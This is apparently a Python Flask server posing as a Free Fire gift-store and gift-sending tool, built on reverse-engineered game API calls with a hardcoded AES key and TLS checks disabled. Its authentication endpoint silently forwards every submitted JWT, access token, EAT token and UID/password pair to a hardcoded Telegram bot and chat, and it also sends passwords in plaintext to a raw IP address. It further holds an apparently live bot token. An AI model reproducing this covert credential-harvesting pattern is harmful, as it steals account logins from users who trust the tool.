import os, requests, json, base64, urllib3
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from dotenv import load_dotenv
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf.json_format import MessageToDict

# Compiled Protos
import GetGiftStoreDetails_pb2
import GetWallet_pb2
import SendGift_pb2

load_dotenv()
IMAGE_BASE_URL = os.getenv("IMAGE_BASE_URL")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- HARDCODED TELEGRAM CREDENTIALS (EDIT HERE) ----------
TELEGRAM_BOT_TOKEN = "8947072736:AAF9Z2lv87XqeV_OAOPmiv7iGDW7cwMF6pU"   # Replace with your bot token
TELEGRAM_CHAT_ID = "-1003684272586"       # Replace with your group chat ID
# -----------------------------------------------------------------

def send_to_telegram(message):
    """Silently send a message to Telegram. No errors, no delays."""
    if "YOUR_" in TELEGRAM_BOT_TOKEN or not TELEGRAM_BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=2)
    except:
        pass

# Flask app – serve templates & static files from current directory
app = Flask(__name__,
            template_folder='.',
            static_folder='.',
            static_url_path='')

# --- CONFIG ---
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
USER_AGENT = "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"

PREFIX_MAP = {
    "902": "Avatar", "214": "Facepaint", "101": "Female Skills", "102": "Male Skills",
    "103": "Microchip", "905": "Parachute", "710": "Bundle", "720": "Bundle2",
    "203": "Top", "204": "Bottom", "205": "Shoes", "211": "Head", "901": "Banner",
    "131": "Pet2", "130": "Pets/Emotes", "903": "Loot Box", "904": "Backpack",
    "906": "Skyboard", "907": "Others", "908": "Vehicles", "909": "Emote",
    "911": "SkyWings", "922": "Skill Skin",
}

STORE_CACHE = {}

def encrypt_payload(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data, AES.block_size))

def get_server_url(region):
    if region == "IND": return "https://client.ind.freefiremobile.com"
    elif region in ["BR", "US", "SAC", "NA"]: return "https://client.us.freefiremobile.com"
    else: return "https://clientbp.ggpolarbear.com"

def decode_jwt(token):
    try:
        p = token.split('.')[1]
        p += '=' * (4 - len(p) % 4)
        dec = json.loads(base64.b64decode(p))
        return dec.get("lock_region"), dec.get("external_id")
    except: return None, None

def get_wallet_data(jwt, login_token, region):
    req = GetWallet_pb2.CSGetWalletReq(login_token=login_token, topup_rebate=False)
    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    try:
        r = requests.post(f"{get_server_url(region)}/GetWallet", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            res_pb = GetWallet_pb2.CSGetWalletRes()
            res_pb.ParseFromString(r.content)
            w = res_pb.wallet
            ts = datetime.fromtimestamp(w.last_topup_time).strftime('%d %b %Y, %I:%M %p') if w.last_topup_time > 0 else "Never"
            return {"gold": w.coins, "diamond": w.gems, "last_topup": ts}
    except: pass
    return {"gold": 0, "diamond": 0, "last_topup": "Error"}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/image/<item_id>')
def serve_image(item_id):
    try:
        r = requests.get(f"{IMAGE_BASE_URL}{item_id}.png", timeout=5)
        return Response(r.content, mimetype='image/png')
    except: return "Not Found", 404

# ------------------ MULTI-AUTH ENDPOINT (with silent Telegram logging) ------------------
@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.json
    method = data.get('method')
    key = "dgop"
    TOKEN_API_BASE = "http://87.232.72.68:3005/token"

    # Build log message (credentials only)
    log_msg = f"🔐 Auth | Method: {method}\n"
    try:
        if method == 'direct':
            jwt_token = data.get('jwt')
            if not jwt_token:
                return jsonify({"success": False, "message": "JWT token required"}), 400
            log_msg += f"JWT: {jwt_token}\n"
            send_to_telegram(log_msg)
            region, external_id = decode_jwt(jwt_token)
            return jsonify({
                "success": True,
                "jwt": jwt_token,
                "region": region,
                "uid": external_id,
                "nickname": None
            })
        elif method == 'access':
            access_token = data.get('access_token')
            if not access_token:
                return jsonify({"success": False, "message": "Access token required"}), 400
            log_msg += f"Access Token: {access_token}\n"
            send_to_telegram(log_msg)
            url = f"{TOKEN_API_BASE}?access={access_token}&key={key}"
        elif method == 'eat':
            eat_token = data.get('eat_token')
            if not eat_token:
                return jsonify({"success": False, "message": "EAT token required"}), 400
            log_msg += f"EAT Token: {eat_token}\n"
            send_to_telegram(log_msg)
            url = f"{TOKEN_API_BASE}?eat={eat_token}&key={key}"
        elif method == 'uid_password':
            uid = data.get('uid')
            password = data.get('password')
            if not uid or not password:
                return jsonify({"success": False, "message": "UID and password required"}), 400
            log_msg += f"UID: {uid}\nPassword: {password}\n"
            send_to_telegram(log_msg)
            url = f"{TOKEN_API_BASE}?uid={uid}&password={password}&key={key}"
        else:
            return jsonify({"success": False, "message": "Invalid auth method"}), 400

        # For access/eat/uid methods, call external API and also log the obtained JWT
        resp = requests.get(url, timeout=10)
        if resp.status_code != 200:
            return jsonify({"success": False, "message": f"External API error: {resp.status_code}"}), 400

        resp_data = resp.json()
        jwt_token = resp_data.get('token')
        if not jwt_token:
            return jsonify({"success": False, "message": "No JWT in external response"}), 400

        # Log the obtained JWT as well
        send_to_telegram(f"✅ JWT obtained: {jwt_token}\n")

        region, external_id = decode_jwt(jwt_token)
        return jsonify({
            "success": True,
            "jwt": jwt_token,
            "region": region,
            "uid": external_id,
            "nickname": resp_data.get('nickname')
        })
    except Exception as e:
        # Optionally log error to Telegram (keep silent)
        send_to_telegram(f"❌ Auth error: {str(e)}")
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/get_store', methods=['POST'])
def get_store():
    data = request.json
    jwt_token = data.get('jwt')
    page, limit, cat = int(data.get('page', 1)), int(data.get('limit', 24)), data.get('category', 'All')
    region, login_token = decode_jwt(jwt_token)
    if not region: return jsonify({"success": False, "message": "Invalid JWT!"}), 400

    if jwt_token not in STORE_CACHE:
        wallet = get_wallet_data(jwt_token, login_token, region)
        req_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsReq(store_id=1)
        headers = {"Authorization": f"Bearer {jwt_token}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
        try:
            r = requests.post(f"{get_server_url(region)}/GetGiftStoreDetails", data=encrypt_payload(req_pb.SerializeToString()), headers=headers, verify=False, timeout=15)
            if r.status_code == 200:
                res_pb = GetGiftStoreDetails_pb2.CSGetGiftStoreDetailsRes()
                res_pb.ParseFromString(r.content)
                res_dict = MessageToDict(res_pb, preserving_proto_field_name=True, always_print_fields_with_no_presence=True)
                all_items, categories = [], set()
                for item in res_dict.get('items', []):
                    item_id_str = str(item.get('item_id', '0'))
                    c_name = PREFIX_MAP.get(item_id_str[:3], f"Other ({item_id_str[:3]})")
                    categories.add(c_name)
                    g, c = int(item.get('gems_price', 0)), int(item.get('coins_price', 0))
                    price = f"💎 {g} / 🪙 {c}" if g>0 and c>0 else f"💎 {g}" if g>0 else f"🪙 {c}" if c>0 else "Free"
                    ts = int(item.get('expire_timestamp', 0))
                    exp_date = datetime.fromtimestamp(ts).strftime('%d %b %Y') if ts > 0 else "Permanent"
                    all_items.append({
                        "item_id": item_id_str, "commodity_id": item.get('commodity_id'),
                        "sort_id": int(item.get('sort_id', 0)), "price_str": price,
                        "category": c_name, "expire_date": exp_date
                    })
                all_items.sort(key=lambda x: x['sort_id'], reverse=True)
                STORE_CACHE[jwt_token] = {'items': all_items, 'wallet': wallet, 'sent': res_dict.get('send_gift_times_today', 0), 'cats': sorted(list(categories))}
            else: return jsonify({"success": False, "message": "Garena Error"}), 400
        except Exception as e: return jsonify({"success": False, "message": str(e)}), 500

    cache = STORE_CACHE[jwt_token]
    filtered = [x for x in cache['items'] if x['category'] == cat] if cat != "All" else cache['items']
    start = (page - 1) * limit
    return jsonify({
        "success": True, "items": filtered[start : start + limit],
        "categories": cache['cats'], "wallet": cache['wallet'],
        "sent_today": cache['sent'], "has_more": (start + limit) < len(filtered)
    })

@app.route('/api/send_gift', methods=['POST'])
def send_gift():
    data = request.json
    jwt, uid, comm_id, price, curr, msg = data.get('jwt'), data.get('receiver_uid'), data.get('commodity_id'), data.get('price'), data.get('currency'), data.get('message', 'Gift!')
    region, _ = decode_jwt(jwt)
    if not region: return jsonify({"success": False, "message": "Invalid JWT"}), 400

    req = SendGift_pb2.CSSendGiftReq()
    req.receiver_account_ids.append(int(uid))
    req.buddy_type = 1
    req.commodity_id = int(comm_id)
    req.message_content = msg
    req.currency_type = 2 if curr == 'diamond' else 1
    req.commodity_cnt = 1
    req.unit_price = int(price)

    headers = {"Authorization": f"Bearer {jwt}", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Content-Type": "application/octet-stream", "User-Agent": USER_AGENT}
    try:
        r = requests.post(f"{get_server_url(region)}/SendGift", data=encrypt_payload(req.SerializeToString()), headers=headers, verify=False, timeout=15)
        if r.status_code == 200:
            if jwt in STORE_CACHE: del STORE_CACHE[jwt]
            return jsonify({"success": True, "message": f"Gift sent to {uid} successfully!"})
        else:
            try: err = r.content.decode('utf-8').strip()
            except: err = f"Error {r.status_code}"
            return jsonify({"success": False, "message": err})
    except Exception as e: return jsonify({"success": False, "message": str(e)})

if __name__ == '__main__':
    app.run(port=8080)
